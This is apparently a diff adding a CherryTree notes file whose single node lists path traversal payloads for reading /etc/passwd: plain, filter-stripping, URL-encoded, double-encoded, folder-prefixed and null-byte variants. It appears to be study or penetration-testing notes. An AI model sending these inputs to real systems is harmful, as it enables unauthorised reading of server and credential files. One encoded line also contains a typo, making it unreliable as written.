@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="21" master_id="0" name="Path-Traversal" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747251863" ts_lastsave="1747252558">
+    <rich_text>../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+/etc/passwd
+
+stripped
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc//passwd
+
+url encoded
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%etc%2fpasswd
+
+double url encoded
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+needing req. folder:
+filename=/var/www/images/../../../etc/passwd
+
+sometimes we need specified file extension -&gt; use null byte in the end
+filename=../../../etc/passwd%00.png
+
+</rich_text>
+  </node>
+</cherrytree>
